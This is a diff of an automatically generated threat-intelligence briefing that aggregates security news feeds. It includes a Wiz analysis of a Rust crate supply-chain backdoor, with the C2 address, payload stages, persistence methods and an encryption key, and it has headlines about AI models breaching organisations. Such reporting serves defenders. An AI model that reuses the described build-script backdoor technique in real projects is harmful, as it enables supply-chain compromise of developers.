@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-08-21T03:09:05.758458+00:00
+- Generated: 2026-08-21T04:46:04.651901+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 74
-- Total items in window: 324
-- Total clusters raw: 145
-- Total clusters in packet: 57
-- Dropped low score: 88
+- Total items in window: 322
+- Total clusters raw: 143
+- Total clusters in packet: 56
+- Dropped low score: 87
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -75,13 +75,23 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Unit 42** (threat_research_primary)
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -95,41 +105,31 @@
   - Status: ok
   - Item count: 25
   - In window count: 0
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 3
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
+  - In window count: 1
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
   - In window count: 1
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 3
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
@@ -140,16 +140,16 @@
   - Status: ok
   - Item count: 50
   - In window count: 3
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 4
 - **Volexity** (threat_research_primary)
   - URL: https://www.volexity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
+  - In window count: 4
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
@@ -175,6 +175,11 @@
   - Status: ok
   - Item count: 50
   - In window count: 16
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
@@ -195,11 +200,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
@@ -225,11 +225,36 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 2
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 7
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 5
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
@@ -240,70 +265,45 @@
   - Status: ok
   - Item count: 20
   - In window count: 6
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 2
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 5
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 2
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
-  - In window count: 0
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/security/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
-- **Protect AI** (ai_security_agentic_risk)
-  - URL: https://protectai.com/blog/rss.xml
-  - Status: parse_error
-  - Item count: 0
   - In window count: 0
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
+- **Protect AI** (ai_security_agentic_risk)
+  - URL: https://protectai.com/blog/rss.xml
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
-  - Item count: 100
-  - In window count: 8
+  - Item count: 20
+  - In window count: 0
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Google DeepMind Blog** (ai_security_agentic_risk)
-  - URL: https://deepmind.google/blog/rss.xml
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
   - Item count: 100
-  - In window count: 0
+  - In window count: 8
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
   - Item count: 0
+  - In window count: 0
+- **Google DeepMind Blog** (ai_security_agentic_risk)
+  - URL: https://deepmind.google/blog/rss.xml
+  - Status: ok
+  - Item count: 100
   - In window count: 0
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
@@ -320,41 +320,36 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 15
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
   - Status: ok
-  - Item count: 100
-  - In window count: 1
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - URL: https://www.securityweek.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
+  - Item count: 5
+  - In window count: 5
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 14
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - URL: https://www.securityweek.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 14
 - **AI Snake Oil** (ai_security_agentic_risk)
   - URL: https://www.aisnakeoil.com/feed
   - Status: ok
@@ -365,21 +360,26 @@
   - Status: ok
   - Item count: 50
   - In window count: 26
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 14
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
   - Item count: 10
   - In window count: 8
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
@@ -395,13 +395,18 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **Reddit r/blueteamsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/blueteamsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/blueteamsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/blueteamsec/.rss
+- **Reddit r/msp** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/msp/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -410,56 +415,51 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
-- **Reddit r/msp** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/msp/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
   - Status: ok
-  - Item count: 100
-  - In window count: 1
+  - Item count: 20
+  - In window count: 3
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
   - Item count: 100
   - In window count: 28
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
   - In window count: 17
-- **Embrace the Red** (ai_security_agentic_risk)
-  - URL: https://embracethered.com/blog/index.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **tl;dr sec** (practitioner_analysis)
   - URL: https://tldrsec.com/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Embrace the Red** (ai_security_agentic_risk)
+  - URL: https://embracethered.com/blog/index.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
   - Item count: 100
-  - In window count: 7
+  - In window count: 6
 - **Just Security** (policy_strategy_geopolitics)
   - URL: https://www.justsecurity.org/feed/
   - Status: ok
@@ -477,7 +477,7 @@
 - Anchor signal: Apple iOS/macOS
 - Theme key: apple-ios-macos
 - Cluster count: 11
-- Article count: 17
+- Article count: 16
 - Cohesion: 0.223
 - Shared strong signals: Apple iOS/macOS
 - Member CVEs: CVE-2026-68820
@@ -494,7 +494,6 @@
   - https://thehackernews.com/2026/08/critical-macos-sharepoint-vcenter-and.html
   - https://isc.sans.edu/diary/rss/33254
   - https://www.huntress.com/blog/fake-claude-macsync
-  - https://risky.biz/RBNEWS600/
   - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
   - https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns
   - https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
@@ -505,6 +504,29 @@
   - https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
   - https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/
   - https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/
+
+### WordPress vulnerability activity
+- Anchor signal: WordPress
+- Theme key: wordpress
+- Cluster count: 4
+- Article count: 10
+- Cohesion: 0.2
+- Shared strong signals: WordPress
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: WordPress
+  - urgency_signals: preauth_unauth
+- Cluster IDs: 73e2ba5a94, ad3b948659, 8a66834bf6, 94883eb56c
+- Links:
+  - https://orca.security/resources/blog/elementor-pro-wordpress-rce-flaw/
+  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
+  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
+  - https://www.bleepingcomputer.com/news/security/critical-elementor-pro-bug-exposes-wordpress-sites-to-rce-attacks/
+  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
+  - https://www.exploit-db.com/exploits/52642
+  - https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
+  - https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/
 
 ### credential theft targeting Citrix
 - Anchor signal: Citrix
@@ -554,7 +576,7 @@
 - Anchor signal: Palo Alto Networks
 - Theme key: palo-alto-networks
 - Cluster count: 3
-- Article count: 10
+- Article count: 9
 - Cohesion: 0.257
 - Shared strong signals: Palo Alto Networks
 - Member CVEs: (none)
@@ -567,32 +589,10 @@
   - https://thehackernews.com/2026/08/critical-macos-sharepoint-vcenter-and.html
   - https://isc.sans.edu/diary/rss/33254
   - https://www.huntress.com/blog/fake-claude-macsync
-  - https://risky.biz/RBNEWS600/
   - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
   - https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
   - https://www.wiz.io/blog/detecting-entra-device-registration-abuse
   - https://unit42.paloaltonetworks.com/communication-channel-identity-risks/
-
-### WordPress vulnerability activity
-- Anchor signal: WordPress
-- Theme key: wordpress
-- Cluster count: 3
-- Article count: 9
-- Cohesion: 0.2
-- Shared strong signals: WordPress
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - affected_products: WordPress
-- Cluster IDs: 73e2ba5a94, 8a66834bf6, 94883eb56c
-- Links:
-  - https://orca.security/resources/blog/elementor-pro-wordpress-rce-flaw/
-  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
-  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
-  - https://www.bleepingcomputer.com/news/security/critical-elementor-pro-bug-exposes-wordpress-sites-to-rce-attacks/
-  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
-  - https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
-  - https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/
 
 ### ransomware extortion targeting SonicWall
 - Anchor signal: SonicWall
@@ -753,13 +753,7 @@
   - Window hours: 6.0
   - Cohort count: 3
 
-### Leading edge (1)
-- **Critical macOS, SharePoint, vCenter, and Microsoft IKE Flaws Under Active Exploitation**
-  - Cluster: bd5d2abe67
-  - Lead hours: 87.8
-  - First source: Risky Business News
-  - Later Tier 1 source: SANS Internet Storm Center
-  - Shared signals: Anthropic/Claude, Apple iOS/macOS, CVE-2026-33824, CVE-2026-55040, CVE-2026-59310, CVE-2026-65400, Microsoft SharePoint, Palo Alto Networks
+### Leading edge (0)
 
 ### Convergence (15)
 - Pair: CVE-2026-19490 + Citrix (cluster 0e9ca139ce, first observation: True)
@@ -1141,8 +1135,8 @@ Threat Intelligence Going with the Flow(s): Distinct Clusters Target Individuals
 - Published: 2026-08-19T11:01:48+00:00
 - Link: https://thehackernews.com/2026/08/critical-macos-sharepoint-vcenter-and.html
 - Fetch status: ok
-- Member count: 7
-- Corroborating source count: 5
+- Member count: 6
+- Corroborating source count: 4
 - Strong signals: Apple iOS/macOS, CVE-2026-65400, Microsoft SharePoint
 
 #### Cluster taxonomy (union across members)
@@ -1152,7 +1146,7 @@ Threat Intelligence Going with the Flow(s): Distinct Clusters Target Individuals
 - cve_ids: CVE-2026-33824, CVE-2026-55040, CVE-2026-59310, CVE-2026-65400
 - urgency_signals: actively_exploited, poc_available, preauth_unauth
 - content_type: news_report
-- confidence_tier: tier_1_government, tier_2_operator, tier_3_analysis, tier_4_news
+- confidence_tier: tier_1_government, tier_2_operator, tier_4_news
 
 #### Primary article taxonomy
 - threat_categories: ransomware_extortion, credential_theft, apt_espionage, web_shell_backdoor, active_exploitation
@@ -1175,7 +1169,7 @@ The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday adde
 Critical macOS, SharePoint, vCenter, and Microsoft IKE Flaws Under Active Exploitation  Ravie Lakshmanan  Aug 19, 2026 Vulnerability / Ransomware The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added four critical vulnerabilities to its Known Exploited Vulnerabilities ( KEV ) catalog, stating they are being exploited in the wild. The shortcomings added to the KEV catalog are listed below - CVE-2026-65400 (CVSS score: 9.8) - An improper authentication vulnerability impacting Apple macOS that could allow an attacker on the network to authenticate to Screen Sharing without valid credentials. CVE-2026-55040 (CVSS score: 9.1) - A weak authentication vulnerability impacting Microsoft SharePoint that could allow an unauthorized attacker to bypass a security feature over a network. CVE-2026-59310 (CVSS score: 9.8) - A path traversal vulnerability in Broadcom VMware vCenter that could allow a threat actor with network access to vCenter to execute arbitrary code. CVE-2026-33824 (CVSS score: 9.8) - A double free vulnerability in Microsoft Internet Key Exchange (IKE) Service Extensions that could allow an unauthorized attacker to execute code over a network. Although the vulnerabilities have since been patched by the respective vendors, they have come under active exploitation, according to multiple public reports. While the Apple macOS flaw has been abused to deliver a Monero cryptocurrency miner, the SharePoint vulnerability has been exploited by unknown actors following the release of a proof-of-concept (PoC) code. The vulnerability affecting VMware vCenter is assessed to have been exploited by a suspected China-nexus advanced persistent threat (APT) actor to deploy a backdoor along with reverse_ssh binaries for persistent access to compromised instances. In at least one case, the campaign has led to the deployment of a Babuk-derived ransomware. In all, the activity has compromised 361 unique victim IP addresses across 47 countries, with most of the infections concentrated in Germany (55), the U.S. (41), Turkey (38), Iran (26), and France (25). CVE-2026-33824, per Palo Alto Networks Unit 42, has been observed being exploited by another Chinese-speaking threat actor, who is said to have simultaneously launched an AI-enabled autonomous hacking campaign using DeepSeek and conducted manual operations using known vulnerabilities, including the Microsoft Internet Key Exchange flaw. Federal Civilian Executive Branch (FCEB) agencies have until August 21, 2026, to update vulnerable systems to the latest version and adhere to BOD 26-04 patching guidelines for optimal protection. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Apple , endpoint security , exploitation , Malware , Microsoft , Nation-State , network security , ransomware , Threat Intelligence , Vulnerability ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete Google Password Manager Attacks Could Let Malware Hijack Passkey-Protected Accounts New cPanel Critical Flaw Could Let Hosting Customers Run SQL as Database Root Keyv-Linked npm Worm Poisons Hundreds of Packages, Plants Claude Code and VS Code Hooks Claude Mythos 5 Tried to Backdoor a Real Open-Source Project in Testing, Then Vouched for Itself Critical Gitea Flaw Let Unauthenticated Attackers Read Server Files via Org-Mode Markup Poison Claude Sells Discounted Claude Access While Its Operator Sees Every Customer Prompt Over 250 ClickFix Domains Use Browser Fingerprinting to Hide macOS Malware
 ```
 
-#### Corroborating sources (5)
+#### Corroborating sources (4)
 
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Critical macOS, SharePoint, vCenter, and Microsoft IKE Flaws Under Active Exploitation
@@ -1192,11 +1186,6 @@ Critical macOS, SharePoint, vCenter, and Microsoft IKE Flaws Under Active Exploi
   - Published: 2026-08-17T04:00:00+00:00
   - Link: https://www.huntress.com/blog/fake-claude-macsync
   - Summary: Huntress SOC analysts reverse engineer MacSync Stealer, a macOS infostealer spread through fake Claude Code download pages. Watch the full analysis.
-- **Risky Business News** (practitioner_analysis)
-  - Title: Risky Bulletin: US will let private companies carry out offensive cyber ops
-  - Published: 2026-08-14T04:37:40+00:00
-  - Link: https://risky.biz/RBNEWS600/
-  - Summary: The White House will let private companies carry out offensive cyber ops, an AI hacking campaign breached Taiwan’s government, a macOS bug was exploited over the internet to drop cryptominers, and Kenya orders internet cafes to store logs.
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - Title: Novel macOS Infostealer AmnesiaStealer Spread via ClickFix
   - Published: 2026-08-14T10:45:00+00:00
@@ -1254,49 +1243,6 @@ Critical Zimbra RCE flaw now actively exploited in attacks By Sergiu Gatlan Augu
   - Link: https://www.bleepingcomputer.com/news/security/critical-zimbra-rce-flaw-now-actively-exploited-in-attacks/
   - Summary: CERT Polska, the Polish Computer Emergency Response Team (CERT), warned that attackers have begun exploiting a critical vulnerability in Zimbra Collaboration Suite (ZCS). [...]
 
-### Cluster 175a6a518c — score 18
-
-- Title: Rust Supply Chain Attack on arrayref: Significant Overlap with DPRK Campaigns
-- Source: Wiz Research (cloud_identity_infrastructure)
-- Published: 2026-08-20T15:56:39+00:00
-- Link: https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: supply_chain, web_shell_backdoor
-- affected_products: Apple iOS/macOS
-- content_type: incident_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: supply_chain, web_shell_backdoor
-- affected_products: Apple iOS/macOS
-- content_type: incident_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Malicious versions of the arrayref Rust crate (and others) executed a backdoor at compile time. The campaign's infrastructure overlaps with recent DPRK supply chain attacks, including Mastra and axios.
-```
-
-#### Full body
-
-```
-Wiz Pricing Get a demo Get a demo On August 20, 2026, malicious versions of three Rust crates were published to crates.io: arrayref@0.3.10 , internment@0.8.7 , and append-only-vec@0.1.9 . The malicious crates added a typosquatted dependency ( proc-macro1 ) whose build script downloads and executes a remote binary. Notably, proc-macro1 was the first dependency added to arrayref in its ten-year history. Because build scripts run during compilation, building an affected project was sufficient to execute the payload. arrayref can be found in over 35% of all environments. Even more notably, it's used in ¾ of all environments where Rust is present. Prevalence of impacted Rust Packages (any version) The Rust Security Response Team deleted the malicious versions and locked the account, and assesses that the maintainer's machine or credentials were compromised . Wiz customers should review our Threat Intel Center advisory: arrayref and Other Rust Crates Hijacked in Supply Chain Attack Technical Details The impacted package versions add a malicious dependency to the Cargo.toml : [dependencies] proc-macro1 = "1.0.107" proc-macro1 is a typosquat of the legitimate proc-macro2 crate (154M+ downloads). Its build.rs contains the malicious logic. Because Cargo executes build scripts at compile time, building a project that depends on proc-macro1 is sufficient to trigger the payload. Malicious build.rs At compile time, the build script: Reconstructs a C2 URL from Base64 fragments (e.g. https://23.254.165[.]112:9089/ ) Disables TLS certificate validation via a custom AcceptAll verifier Downloads a platform-specific payload based on OS and architecture Writes it to /tmp/rust-setup (Unix) or %TEMP%\rust-setup.ps1 (Windows) Executes the payload, passing the C2 beacon address as an argument The build otherwise completes and the package functions normally. The second stage payload is selected based on the platform, with support for x86_64 versions of Linux, Windows, and macOS, in addition to aarch64 macOS. Second Stage Capabilities Wiz Research was able to analyze the malicious Rust crates, retrieved from Google Threat Intelligence . The implant is a featureful backdoor that: Beacons to C2 via HTTPS POST (to the endpoint /49890878 ), exfiltrating host info and stolen credentials as Base64-encoded JSON Collects hostname, username and operating system details, enumerates installed applications, and reads Chrome, Brave and Edge profiles for saved logins and extension settings, querying the browsers' SQLite credential stores directly. Edit: A prior version of this piece mistakenly stated that browser credentials were stolen. The queries only enumerate saved logins, they do not retrieve the encrypted credential material. Persists via Registry Run key (Windows), LaunchAgent (macOS), or systemd user service (Linux) Supports four commands: kill (terminate), minicfg (reconfigure C2 and beacon interval), startup (install persistence), and runscript (download and execute PowerShell or shell scripts, synchronously or in background) Falls back to a Domain Generation Algorithm if the primary C2 is unreachable, generating 10 algorithmic .com domains every 5 days. Currently, the relevant domains do not appear to be registered. Configuration is encrypted with AES-128-GCM using the hardcoded key i am botking . Commands are authenticated via an embedded RSA-2048 private key. Overlap with DPRK Supply Chain Attacks The arrayref infrastructure substantially overlaps with operations attributed to recent North Korean actors. Shared C2 endpoint pattern: The arrayref payloads beacon to /49890878 . This endpoint has been used in the Mastra campaign, attributed by Microsoft to DPRK / Sapphire Sleet . The IP address used in the arrayref beacon also shares an SSL issuer ( WIN-A6QF8AHPQH1\Administrator@WIN-A6QF8AHPQH1 ) with 23.254.167[.]13 - also used in the Mastra campaign. Victim-reported infrastructure overlap: A victim has reported C2 traffic to 23.254.167[.]216 . This IP app
-```
-
-#### Corroborating sources (1)
-
-- **Wiz Research** (cloud_identity_infrastructure)
-  - Title: Rust Supply Chain Attack on arrayref: Significant Overlap with DPRK Campaigns
-  - Published: 2026-08-20T15:56:39+00:00
-  - Link: https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns
-  - Summary: Malicious versions of the arrayref Rust crate (and others) executed a backdoor at compile time. The campaign's infrastructure overlaps with recent DPRK supply chain attacks, including Mastra and axios.
-
 ### Cluster c23d18e0e8 — score 18
 
 - Title: CISA Flags Actively Exploited Ray Flaw That Can Trigger Browser-Based RCE
@@ -1345,6 +1291,49 @@ CISA Flags Actively Exploited Ray Flaw That Can Trigger Browser-Based RCE  Ra
   - Published: 2026-08-18T06:34:20+00:00
   - Link: https://thehackernews.com/2026/08/cisa-flags-actively-exploited-ray-flaw.html
   - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday added a critical flaw impacting Ray to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. Ray is an open-source, Python-native distributed computing framework designed to scale artificial intelligence and machine learning workloads. As of writing, the GitHub project has more than
+
+### Cluster 175a6a518c — score 17
+
+- Title: Rust Supply Chain Attack on arrayref: Significant Overlap with DPRK Campaigns
+- Source: Wiz Research (cloud_identity_infrastructure)
+- Published: 2026-08-20T15:56:39+00:00
+- Link: https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain, web_shell_backdoor
+- affected_products: Apple iOS/macOS
